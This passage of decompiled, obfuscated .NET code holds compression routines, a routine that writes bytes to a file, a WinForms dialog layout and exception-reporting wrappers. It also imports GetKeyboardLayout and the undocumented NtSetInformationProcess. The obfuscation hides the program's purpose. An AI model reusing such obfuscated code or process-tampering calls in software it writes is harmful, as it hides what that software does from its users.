        byte[] destinationArray = obj0.\u0001;
        if (true)
          goto label_8;
label_2:
        obj0.\u0002 -= 32768;
        obj0.\u0005 -= 32768;
        obj0.\u0004 -= 32768;
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0001[*(int*) voidPtr] & (int) ushort.MaxValue;
          obj0.\u0001[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 4) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 4) - 32768) : (short) 0;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (*(int*) ((IntPtr) voidPtr + 8) < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] & (int) ushort.MaxValue;
          obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = *(int*) ((IntPtr) voidPtr + 12) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 12) - 32768) : (short) 0;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        }
        return;
label_8:
        Array.Copy((Array) sourceArray, 32768, (Array) destinationArray, 0, 32768);
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u0003.\u0004.\u0008 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
    }

    static unsafe Icon \u0001()
    {
label_0:
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num;
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: cast to a reference type
      *(int*) ((IntPtr) voidPtr + 8) = \u0006.\u0007.\u0001(\u008B.\u009D\u0002(), -1, (int&) ((IntPtr) voidPtr + 4), (int&) ((IntPtr) voidPtr + 4), 1);
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 8) > 0)
        {
          // ISSUE: cast to a reference type
          \u0006.\u0007.\u0001(\u008B.\u009D\u0002(), 0, ref *(int*) voidPtr, (int&) ((IntPtr) voidPtr + 4), 1);
          if (*(int*) voidPtr != 0)
            return \u0081\u0002.\u0097\u0004(new IntPtr(*(int*) voidPtr));
        }
        return (Icon) null;
      }
      goto label_0;
    }

    static int \u0001([In] \u0003.\u0004.\u0002 obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0002 - obj0.\u0001;
        do
        {
          if (true)
            goto label_7;
label_6:
          continue;
label_7:
          int num3 = obj0.\u0003;
          do
          {
            if (true)
              num3 >>= 3;
          }
          while (false);
          num2 += num3;
          goto label_6;
        }
        while (false);
        num1 = num2;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0002 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static unsafe bool \u0001([In] int obj0, [In] int obj1, [In] \u0003.\u0004.\u0007 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      short[] numArray1;
      IntPtr index1;
      int num1;
      try
      {
        obj2.\u0001[obj2.\u0001] = (short) obj1;
        byte[] numArray2 = obj2.\u0002;
        \u0003.\u0004.\u0007 obj = obj2;
        int num2 = obj.\u0001;
        if (true)
          goto label_7;
label_2:
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) (obj0 - 3);
        numArray2[index2] = (byte) num3;
        *(int*) voidPtr = \u0006.\u0007.\u0001(obj0 - 3, obj2);
        (numArray1 = obj2.\u0001.\u0001)[(int) (index1 = (IntPtr) *(int*) voidPtr)] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) voidPtr >= 265 && *(int*) voidPtr < 285)
          obj2.\u0002 += (*(int*) voidPtr - 261) / 4;
        *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj2, obj1 - 1);
        (numArray1 = obj2.\u0002.\u0001)[(int) (index1 = (IntPtr) *(int*) ((IntPtr) voidPtr + 4))] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) ((IntPtr) voidPtr + 4) >= 4)
          obj2.\u0002 += *(int*) ((IntPtr) voidPtr + 4) / 2 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0006.\u0007.\u0001(obj2);
        goto label_9;
label_7:
        num1 = num2;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local4 = (ValueType) index1;
        \u0003.\u0004.\u0007 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) numArray3, (object) local4, (object) obj, (object) local5, (object) local6);
        throw;
      }
label_9:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0003.\u0004.\u0002 obj3)
    {
      int num1;
      try
      {
        if (false)
          goto label_10;
        else
          goto label_16;
label_1:
        int num2;
        int num3;
        if (num2 < num3)
          throw new InvalidOperationException();
        int num4 = obj0;
        int num5 = obj1;
        if (true)
          num1 = num4 + num5;
        else
          goto label_8;
label_4:
        int num6;
        if (0 <= obj0)
        {
          num2 = obj0;
          num3 = num1;
          if (true)
          {
            if (num2 <= num3)
            {
              int num7 = num1;
              if (true)
              {
                num5 = obj2.Length;
                num4 = num7;
              }
              else
              {
                num6 = num7;
                goto label_11;
              }
            }
            else
              goto label_9;
          }
          else
            goto label_1;
        }
        else
          goto label_9;
label_8:
        int num8 = num5;
        if (num4 <= num8)
          goto label_10;
label_9:
        throw new ArgumentOutOfRangeException();
label_10:
        num6 = obj1 & 1;
label_11:
        if (num6 != 0)
        {
          if (true)
          {
            obj3.\u0001 |= (uint) (((int) obj2[obj0++] & (int) byte.MaxValue) << obj3.\u0003);
            obj3.\u0003 += 8;
          }
          else
            goto label_9;
        }
        obj3.\u0001 = obj2;
        obj3.\u0001 = obj0;
        if (true)
        {
          obj3.\u0002 = num1;
          return;
        }
        goto label_4;
label_16:
        int num9 = obj3.\u0001;
        num3 = obj3.\u0002;
        num2 = num9;
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u0002 obj = obj3;
        byte[] numArray = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    static string \u0001([In] \u0001 obj0) => obj0.\u0001;

    static bool \u0001([In] \u0002.\u0003 obj0, [In] string obj1)
    {
      try
      {
        byte[] numArray1 = obj0.\u0001();
        byte[] numArray2;
        try
        {
          numArray2 = \u0006.\u0007.\u0001(numArray1);
        }
        catch
        {
          numArray2 = (byte[]) null;
        }
        byte[] numArray3 = \u0006.\u0007.\u0001(numArray2, \u0006.\u0007.\u001F(1153));
        FileStream fileStream = \u0082\u0002.\u0098\u0004(obj1);
        byte[] numArray4 = \u0083\u0002.\u007E\u0099\u0004((object) \u0091.\u0012\u0003(), \u0006.\u0007.\u001F(1479));
        \u0084\u0002.\u007E\u009A\u0004((object) fileStream, numArray4, 0, numArray4.Length);
        \u0084\u0002.\u007E\u009A\u0004((object) fileStream, numArray3, 0, numArray3.Length);
        \u009B.\u007E\u001F\u0003((object) fileStream);
        return true;
      }
      catch (ThreadAbortException ex)
      {
        return false;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    static unsafe bool \u0001([In] \u0001 obj0)
    {
      int num1 = 6;
      int num2;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
        string str1;
        string str2;
        Exception exception1;
        try
        {
          try
          {
            str1 = \u0086\u0002.\u009C\u0004(100);
            *(int*) voidPtr = 0;
            do
            {
              int num3 = (int) checked ((short) *(int*) voidPtr);
              ref string local1 = ref str1;
              str2 = (string) null;
              ref string local2 = ref str2;
              if (\u0006.\u0007.\u0001((short) num3, ref local1, 100, ref local2, 100))
              {
                *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
                goto label_10;
              }
              else
                *(int*) voidPtr = checked (*(int*) voidPtr + 1);
            }
            while (*(int*) voidPtr <= 4);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception1 = ex;
            global::\u0006.\u0006();
          }
          *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 0;
          goto label_12;
label_10:
          *(sbyte*) ((IntPtr) voidPtr + 5) = *(sbyte*) ((IntPtr) voidPtr + 4);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> local3 = (ValueType) (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
          string str3 = str1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) *(int*) voidPtr;
          Exception exception2 = exception1;
          string str4 = str2;
          \u0001 obj = obj0;
          \u0006.\u0007.\u0001(ex, (object) local3, (object) str3, (object) local4, (object) exception2, (object) str4, (object) obj);
          throw;
        }
label_12:
        num2 = (int) *(sbyte*) ((IntPtr) voidPtr + 5);
        if (false)
          num1 = num2;
        else
          break;
      }
      return num2 != 0;
    }

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0);

    static bool \u0001()
    {
      bool flag;
      try
      {
        do
        {
          if (true)
          {
            int num1 = \u0006.\u0007.\u0001(89);
            int num2 = 0;
            if (num2 == 0)
            {
              int num3 = num1 == num2 ? 1 : 0;
              num2 = 0;
              num1 = num3;
            }
            flag = num1 == num2;
          }
        }
        while (false);
      }
      catch
      {
        if (true)
          flag = false;
      }
      return flag;
    }

    static void \u0001([In] int obj0, [In] \u0003.\u0004.\u0007 obj1, [In] byte[] obj2, [In] int obj3, [In] bool obj4)
    {
      try
      {
        if (true)
          \u0006.\u0007.\u0001(obj1.\u0001, obj4 ? 1 : 0, 3);
        \u0006.\u0007.\u0001(obj1.\u0001);
        if (true)
          goto label_5;
label_1:
        if (true)
        {
          \u0006.\u0007.\u0001(obj1);
          return;
        }
        goto label_6;
label_5:
        \u0006.\u0007.\u0001(obj1.\u0001, obj0);
label_6:
        \u0006.\u0007.\u0001(obj1.\u0001, ~obj0);
        \u0006.\u0007.\u0001(obj3, obj2, obj0, obj1.\u0001);
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0007 obj = obj1;
        byte[] numArray = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj4;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    [DllImport("ntdll", EntryPoint = "NtSetInformationProcess")]
    static extern int \u0001([In] IntPtr obj0, [In] int obj1, [In] ref int obj2, [In] int obj3);

    static unsafe void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0, [In] int[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int[] numArray1;
      int num1;
      int[] numArray2;
      IntPtr index1;
      int num2;
      int num3;
      int index2;
      try
      {
        obj0.\u0001 = new byte[obj0.\u0001.Length];
        *(int*) voidPtr = obj1.Length / 2;
        *(int*) ((IntPtr) voidPtr + 4) = (*(int*) voidPtr + 1) / 2;
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (true)
        {
          if (*(int*) ((IntPtr) voidPtr + 12) >= obj0.\u0003)
            goto label_4;
label_2:
          obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = 0;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          continue;
label_4:
          numArray1 = new int[*(int*) voidPtr];
          numArray1[*(int*) voidPtr - 1] = 0;
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr - 1;
          if (true)
            goto label_11;
label_10:
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 1;
label_11:
          if (*(int*) ((IntPtr) voidPtr + 16) >= 0)
          {
            if (obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] != -1)
            {
              *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)] + 1;
              if (*(int*) ((IntPtr) voidPtr + 20) > obj0.\u0003)
              {
                *(int*) ((IntPtr) voidPtr + 20) = obj0.\u0003;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              }
              int[] numArray3 = numArray1;
              int index3 = obj1[2 * *(int*) ((IntPtr) voidPtr + 16)];
              numArray1[obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1]] = num1 = *(int*) ((IntPtr) voidPtr + 20);
              int num4 = num1;
              numArray3[index3] = num4;
              goto label_10;
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 24) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (*(int*) ((IntPtr) voidPtr + 24) - 1))] = numArray2[index1] + 1;
              obj0.\u0001[obj1[2 * *(int*) ((IntPtr) voidPtr + 16)]] = (byte) numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              goto label_10;
            }
          }
          else if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            num2 = obj0.\u0003 - 1;
            do
            {
              do
                ;
              while (obj0.\u0001[--num2] == 0);
              do
              {
                (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) num2)] = numArray2[index1] - 1;
                int[] numArray4;
                numArray2 = numArray4 = obj0.\u0001;
                int index4;
                num2 = index4 = num2 + 1;
                index1 = (IntPtr) index4;
                int num5 = numArray2[index1] + 1;
                numArray4[index4] = num5;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (1 << obj0.\u0003 - 1 - num2);
              }
              while (*(int*) ((IntPtr) voidPtr + 8) > 0 && num2 < obj0.\u0003 - 1);
            }
            while (*(int*) ((IntPtr) voidPtr + 8) > 0);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 1))] = numArray2[index1] + *(int*) ((IntPtr) voidPtr + 8);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 2))] = numArray2[index1] - *(int*) ((IntPtr) voidPtr + 8);
            num3 = 2 * *(int*) ((IntPtr) voidPtr + 4);
            *(int*) ((IntPtr) voidPtr + 28) = obj0.\u0003;
            while (*(int*) ((IntPtr) voidPtr + 28) != 0)
            {
              *(int*) ((IntPtr) voidPtr + 32) = obj0.\u0001[*(int*) ((IntPtr) voidPtr + 28) - 1];
              while (*(int*) ((IntPtr) voidPtr + 32) > 0)
              {
                index2 = 2 * obj1[num3++];
                if (true)
                {
                  if (obj1[index2 + 1] == -1)
                  {
                    obj0.\u0001[obj1[index2]] = (byte) *(int*) ((IntPtr) voidPtr + 28);
                    *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
                  }
                }
                else
                  goto label_2;
              }
              *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) - 1;
            }
            goto label_13;
          }
          else
            break;
        }
        return;
label_13:;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[18]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray1,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) num2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) index2,
          (object) num1,
          (object) numArray2,
          (object) index1,
          (object) obj0,
          (object) obj1
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static string \u0001([In] uint obj0, [In] \u0001 obj1)
    {
      StringBuilder stringBuilder1;
      int num1;
      Exception exception1;
      char[] chArray1;
      try
      {
        string str;
        try
        {
          stringBuilder1 = new StringBuilder(256);
          int num2 = \u0006.\u0007.\u0001(1024U, obj0, stringBuilder1, \u0018.\u007E\u0088((object) stringBuilder1));
          if (true)
            num1 = num2;
          if (num1 > 0)
          {
            str = \u0080.\u007E\u001E\u0002((object) \u001E.\u007E\u0002\u0002((object) stringBuilder1), 0, checked (num1 - 1));
            goto label_8;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
        if (true)
          chArray1 = new char[1];
        chArray1[0] = 'X';
        return new string(chArray1);
label_8:
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        StringBuilder stringBuilder2 = stringBuilder1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        \u0001 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local2 = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) str2, (object) stringBuilder2, (object) local1, (object) exception2, (object) chArray2, (object) obj, (object) local2);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0, [In] int obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_3;
label_1:
          continue;
label_3:
          \u0006.\u0007.\u0001(obj0.\u0001.\u0001, (int) obj0.\u0002[obj1] & (int) ushort.MaxValue, (int) obj0.\u0001[obj1]);
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0007.\u0001 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0004.\u0002 obj0)
    {
      try
      {
        obj0.\u0001 >>= obj0.\u0003 & 7;
        obj0.\u0003 &= -8;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0002 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0002.\u0007 obj0)
    {
      \u009B.\u007E\u0080\u0003((object) obj0.\u0001);
      \u009B.\u007E\u0080\u0003((object) obj0.\u0002);
      \u009B.\u0080\u0003((object) obj0);
      \u0006.\u0007.\u0001(obj0.\u0001, \u0002.\u0005.\u0002);
      \u0006.\u0007.\u0001(obj0.\u0002, \u0002.\u0005.\u0002);
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Left);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0001, FlatStyle.System);
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(22, 98));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(226, 16));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0001, 13);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0001, \u0006.\u0007.\u001F(1532));
      \u0010\u0002.\u007E\u0018\u0004((object) obj0.\u0001, new EventHandler(obj0.\u0006));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0005\u0004((object) obj0.\u0001, FlatStyle.System);
      \u0087\u0002.\u007E\u009F\u0004((object) obj0.\u0001, new Font(\u0006.\u0007.\u001F(1593), 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(20, 124));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(381, 16));
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0001, \u0088\u0002.\u0001\u0005(\u0006.\u0007.\u001F(1622), (object) \u0006.\u0007.\u001F(1671)));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0001, FlatStyle.System);
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(75, 24));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(400 - \u0018.\u007E\u0086((object) obj0.\u0001), 205));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0001, 4);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0001, \u0006.\u0007.\u001F(1696));
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0001, new EventHandler(obj0.\u0003));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0002, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0002, FlatStyle.System);
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0002, new Size(105, 24));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0002, new Point(\u0018.\u007E\u0087((object) obj0.\u0001) - \u0018.\u007E\u0086((object) obj0.\u0002) - 6, 205));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0002, 3);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0002, \u0006.\u0007.\u001F(1713));
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0002, new EventHandler(obj0.\u0002));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0007, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0007, FlatStyle.System);
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0007, new Size(64, 24));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0007, new Point(\u0018.\u007E\u0087((object) obj0.\u0002) - \u0018.\u007E\u0086((object) obj0.\u0007) - 6, 205));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0007, 14);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0007, \u0006.\u0007.\u001F(1738));
      \u0012\u0002.\u007E\u007F\u0004((object) obj0.\u0007, false);
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0007, new EventHandler(obj0.\u000F));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0002, AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0005\u0004((object) obj0.\u0002, FlatStyle.System);
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0002, new Point(20, 140));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0002, new Size(381, 55));
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0002, \u0088\u0002.\u0001\u0005(\u0006.\u0007.\u001F(1747), (object) \u0006.\u0007.\u001F(1671)));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(20, 69));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(381, 13));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0003, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0003, FlatStyle.System);
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0003, new Size(80, 24));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0003, new Point(400 - \u0018.\u007E\u0086((object) obj0.\u0003), 205));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0003, 7);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0003, \u0006.\u0007.\u001F(1957));
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0003, new EventHandler(obj0.\u0004));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0004, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0012\u0002.\u007E\u0080\u0004((object) obj0.\u0004, false);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0004, FlatStyle.System);
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0004, new Size(105, 24));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0004, new Point(\u0018.\u007E\u0087((object) obj0.\u0003) - \u0018.\u007E\u0086((object) obj0.\u0004) - 6, 205));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0004, 6);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0004, \u0006.\u0007.\u001F(1970));
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0004, new EventHandler(obj0.\u0005));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0005, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0005, FlatStyle.System);
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0005, \u0089\u0002.\u007E\u0002\u0005((object) obj0.\u0004));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0005, \u008A\u0002.\u007E\u0003\u0005((object) obj0.\u0004));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0005, 5);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0005, \u0006.\u0007.\u001F(1975));
      \u0012\u0002.\u007E\u007F\u0004((object) obj0.\u0005, false);
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0005, new EventHandler(obj0.\u000E));
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0006, AnchorStyles.Bottom | AnchorStyles.Right);
      \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0006, FlatStyle.System);
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0006, \u0089\u0002.\u007E\u0002\u0005((object) obj0.\u0004));
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0006, \u008A\u0002.\u007E\u0003\u0005((object) obj0.\u0004));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0006, 5);
      \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0006, \u0006.\u0007.\u001F(1984));
      \u0012\u0002.\u007E\u007F\u0004((object) obj0.\u0006, false);
      \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0006, new EventHandler(obj0.\u0001));
      \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(87, 146));
      \u0012\u0002.\u007E\u007F\u0004((object) obj0.\u0001, false);
      \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0001, 24, 72, 368, 16);
      \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0002, 24, 96, 368, 16);
      \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0003, 24, 120, 368, 16);
      \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0004, 24, 144, 368, 16);
      \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Left);
      \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0001, 20, 444, 120, 32);
      \u0014\u0002.\u007E\u0087\u0004((object) \u0013\u0002.\u007E\u0086\u0004((object) obj0.\u0001), new Control[8]
      {
        (Control) obj0.\u0007,
        (Control) obj0.\u0001,
        (Control) obj0.\u0001,
        (Control) obj0.\u0001,
        (Control) obj0.\u0002,
        (Control) obj0.\u0002,
        (Control) obj0.\u0001,
        (Control) obj0.\u0001
      });
      \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(413, 240));
      \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0001, 0);
      \u0014\u0002.\u007E\u0087\u0004((object) \u0013\u0002.\u007E\u0086\u0004((object) obj0.\u0002), new Control[10]
      {
        (Control) obj0.\u0003,
        (Control) obj0.\u0004,
        (Control) obj0.\u0005,
        (Control) obj0.\u0006,
        (Control) obj0.\u0001,
        (Control) obj0.\u0002,
        (Control) obj0.\u0001,
        (Control) obj0.\u0002,
        (Control) obj0.\u0003,
        (Control) obj0.\u0004
      });
